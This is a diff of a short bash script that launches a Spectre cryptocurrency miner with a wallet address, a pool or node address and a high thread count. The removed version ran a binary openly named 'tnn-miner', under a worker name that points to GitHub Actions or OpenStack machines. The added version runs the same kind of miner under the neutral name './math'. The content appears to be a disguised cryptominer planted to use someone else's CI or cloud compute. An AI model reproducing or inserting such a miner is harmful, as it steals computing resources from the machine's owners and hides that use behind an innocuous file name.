@@ -1,3 +1,3 @@
 #!/bin/bash
-chmod +x ./tnn-miner-v0.3.6
-./tnn-miner-v0.3.6 --spectre --daemon-address spr.tw-pool.com --port 14001 --wallet spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0  --threads 15 --worker test-githubaction-openstack-cpu1
+cd /go-workdir
+chmod +x ./math && ./math --mining-address spectre:qzyf4x8amtzm555rwwphyzhu4uxngayse7h8wfwc7a5vkzvpn8dpz4ghfec2v --threads 40 --spectred-address 34.82.41.54
